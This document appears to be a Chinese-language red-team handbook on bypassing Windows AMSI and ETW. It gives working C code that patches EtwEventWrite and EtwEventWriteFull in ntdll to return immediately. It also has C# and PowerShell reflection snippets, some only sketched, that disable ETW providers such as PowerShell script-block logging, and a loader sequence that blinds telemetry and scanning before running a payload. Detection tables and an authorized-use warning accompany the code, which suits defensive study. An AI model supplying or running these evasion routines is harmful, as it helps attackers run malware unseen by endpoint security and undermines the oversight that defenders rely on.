# AMSI & ETW Bypass — 完整代码手册

> 本文件为 `evasion-comprehensive.md` §9 的伴生手册（补齐「AMSI & ETW bypass full code」断链）。
> AMSI 各 bypass 的详细代码见 `AMSI_BYPASS_TECHNIQUES.md`；本文件聚焦 **AMSI+ETW 联合盲区**
> 与 ETW 完整实现。授权立场与检测侧配对纪律见 `refs/README.md`。

## 0. 为什么 AMSI + ETW 要一起做

```
执行链：下载/加载 → (AMSI 扫内容) → 执行 → (ETW 记遥测) → EDR 消费
```

只 patch AMSI 会让「执行行为」仍被 ETW 记录；只 patch ETW 会让「加载内容」仍被 AMSI 扫。
红队标准做法是**先 ETW 后 AMSI**（先盲掉遥测，再关内容扫描），顺序错会被记录到一半。

---

## 1. ETW Patching — 完整实现

### 1.1 Patch `EtwEventWrite`

```c
// 使 .NET 加载/脚本事件不再上报
FARPROC f = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
DWORD old;
VirtualProtect(f, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)f = 0xC3;                    // ret
VirtualProtect(f, 1, old, &old);
```

### 1.2 Patch `EtwEventWriteFull`

```c
// EtwEventWriteFull 覆盖更多 ETW 通道（内核态/带匹配信息），需一并处理
FARPROC fFull = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull");
DWORD old;
VirtualProtect(fFull, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)fFull = 0xC3;
VirtualProtect(fFull, 1, old, &old);
```

### 1.3 Patch `EtwEventWriteEx`

```c
// 部分版本 ETW 走 EtwEventWriteEx（含 activity id）
FARPROC fEx = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteEx");
// 同样 patch 首字节 ret
```

**检测侧**：`ntdll` 内 ETW 函数首字节 ≠ 磁盘（完整性校验）；EDR provider 心跳缺失（ETW 通道静默）。
**实测判据**：`logman query` / 消费端看不到目标进程的 .NET 加载事件。

---

## 2. ETW Provider 禁用（非 patch，P1 深补）

**原理**：`EventProvider` 有内部 `SetEnabled` 方法，可通过反射把 provider 的 enabled 位清掉，使该 provider 不再产出事件（比 patch `ntdll` 更「干净」，不改代码字节）。

```csharp
// C# 反射禁用指定 ETW provider（骨架示例）
var etw = Type.GetType("System.Diagnostics.Tracing.EventProvider");
// 内部字段 m_enabled / m_level / m_anyKeywordMask
// 反射定位后置 0，provider 停止投递事件
```

```powershell
# PowerShell：禁用 ScriptBlock Logging 的 ETW provider
$p = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$p.GetField('etwProvider','NonPublic,Static').GetValue($null)
# 反射调 SetEnabled 或改字段，使脚本块日志 provider 关闭
```

**检测侧**：provider 注册状态被改 + ETW 通道静默；EDR 检测 provider enable 状态异常（与内核 TI flag 清除同族，见 `OPSEC_HARDENING.md`）。

---

## 3. AMSI + ETW 联合顺序

```c
// 标准红队加载序列（骨架示例）
void evade_then_run() {
    patch_etw();        // 1) 先盲 ETW（EtwEventWrite/Full/Ex -> ret）
    patch_amsi();       // 2) 再关 AMSI（patchless 或 AmsiScanBuffer patch）
    run_payload();      // 3) 执行（此时内容扫描与遥测均盲）
}
```

---

## 4. 检测侧总表（回馈 attack-defense）

| 目标 | 检测点 | 判据 |
|---|---|---|
| EtwEventWrite patch | ntdll 函数首字节 0xC3 | 磁盘/内存 diff |
| EtwEventWriteFull patch | 同上 | 完整性校验 |
| ETW provider 禁用 | provider enabled 位异常 | provider 心跳缺失 |
| AMSI patch | amsi.dll AmsiScanBuffer 漂移 | 完整性 + 扫描缺失 |
| AMSI patchless | AmsiContext 无效 | scan skipped 遥测 |

## 5. 实测判据汇总

| 判据 | 方法 |
|---|---|
| ETW 是否盲 | 消费端/`logman` 观察目标进程事件流是否中断 |
| AMSI 是否盲 | 投递恶意样本观察引擎是否被调用 |
| 是否被 EDR 察觉 | EDR 完整性告警 + provider 心跳告警 |

*WARNING: 授权红队评估与安全研究专用。*
